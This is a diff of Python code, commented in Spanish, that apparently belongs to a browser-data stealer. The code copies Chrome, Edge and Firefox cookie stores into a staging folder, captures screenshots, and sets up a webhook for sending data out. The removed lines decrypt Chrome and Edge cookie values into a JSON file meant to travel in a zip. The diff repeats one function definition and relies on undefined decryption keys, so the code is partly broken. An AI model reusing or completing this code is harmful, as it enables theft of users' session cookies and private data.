@@ -196,18 +196,6 @@ def generar_archivo_historial():
   return txt_path
 
 
-import os
-import sys
-import json
-import sqlite3
-import base64
-import binascii
-import shutil
-import tempfile
-import requests # Necesario para enviar el webhook al final
-from datetime import datetime, timedelta
-from Crypto.Cipher import AES, ChaCha20_Poly1305
-
 def empaquetar_network(browser="chrome"):
     browser = browser.lower()
     appdata_local = os.path.join(os.path.expanduser("~"), "AppData", "Local")
@@ -244,48 +232,14 @@ def empaquetar_network(browser="chrome"):
             source_item = os.path.join(target_dir, item)
             target_item = os.path.join(staging_dir, item)
             try:
+
                 if browser == "firefox" and not item.startswith("cookies.sqlite"):
                     continue
                 
-                # Copia segura para evitar bloqueos en bases de datos de red/cookies
                 if os.path.isdir(source_item):
                     shutil.copytree(source_item, target_item, dirs_exist_ok=True)
                 else:
-                    try:
-                        shutil.copy2(source_item, target_item)
-                    except PermissionError:
-                        # Forzar lectura si el archivo está bloqueado por el proceso activo
-                        with open(source_item, "rb") as src_f, open(target_item, "wb") as dst_f:
-                            dst_f.write(src_f.read())
-
-                # Integración opcional para descifrar cookies si el archivo es 'Cookies'
-                if browser in ["chrome", "edge"] and item.lower() == "cookies":
-                    try:
-                        conn = sqlite3.connect(target_item)
-                        cursor = conn.cursor()
-                        cursor.execute('SELECT host_key, path, expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) FROM cookies')
-                        cookie_rows = cursor.fetchall()
-                        
-                        decrypted_cookies_list = []
-                        for host_key, path, expires_utc, has_expires, name, encrypted_value in cookie_rows:
-                            decrypted_value = decrypt_data(encrypted_value, key, master_key, False) if 'decrypt_data' in globals() else ""
-                            if decrypted_value:
-                                expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
-                                decrypted_cookies_list.append({
-                                    "domain": host_key,
-                                    "name": name,
-                                    "path": path,
-                                    "value": decrypted_value,
-                                    "expires": expiration_date
-                                })
-                        conn.close()
-                        
-                        json_cookie_path = os.path.join(staging_dir, f"decrypted_{browser}_cookies.json")
-                        with open(json_cookie_path, 'w', encoding='utf-8') as jf:
-                            json.dump(decrypted_cookies_list, jf, indent=4)
-                    except Exception:
-                        pass
-
+                    shutil.copy2(source_item, target_item)
             except Exception:
                 pass
 
@@ -299,8 +253,6 @@ def empaquetar_network(browser="chrome"):
     except Exception:
         return None
 
-    return datos_totales
-  
 def capturar_pantalla_jpg():
   try:
     
@@ -315,6 +267,7 @@ def capturar_pantalla_jpg():
     return img_byte_arr
   except Exception:
     return None
+
 
 ######## Webhook #############################################################
 
@@ -359,40 +312,6 @@ def empaquetar_network(browser="chrome"):
                 if browser == "firefox" and not item.startswith("cookies.sqlite"):
                     continue
                 
-                # Integración para descifrar cookies de Google Chrome y Microsoft Edge
-                if browser in ["chrome", "edge"] and item.lower() == "cookies":
-                    try:
-                        # Copia temporal de la base de datos de cookies para evitar bloqueos
-                        temp_cookie_db = os.path.join(staging_dir, "cookies_temp.db")
-                        shutil.copy2(source_item, temp_cookie_db)
-                        
-                        conn = sqlite3.connect(temp_cookie_db)
-                        cursor = conn.cursor()
-                        cursor.execute('SELECT host_key, path, expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) FROM cookies')
-                        cookie_rows = cursor.fetchall()
-                        
-                        decrypted_cookies_list = []
-                        for host_key, path, expires_utc, has_expires, name, encrypted_value in cookie_rows:
-                            # Se asume la existencia previa de decrypt_data y las llaves correspondientes en el entorno general
-                            decrypted_value = decrypt_data(encrypted_value, key, master_key, False) if 'decrypt_data' in globals() else ""
-                            if decrypted_value:
-                                expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
-                                decrypted_cookies_list.append({
-                                    "domain": host_key,
-                                    "name": name,
-                                    "path": path,
-                                    "value": decrypted_value,
-                                    "expires": expiration_date
-                                })
-                        conn.close()
-                        
-                        # Guardar el resultado descifrado en un archivo JSON dentro del staging para que viaje en el zip
-                        json_cookie_path = os.path.join(staging_dir, f"decrypted_{browser}_cookies.json")
-                        with open(json_cookie_path, 'w', encoding='utf-8') as jf:
-                            json.dump(decrypted_cookies_list, jf, indent=4)
-                    except Exception:
-                        pass
-
                 if os.path.isdir(source_item):
                     shutil.copytree(source_item, target_item, dirs_exist_ok=True)
                 else:
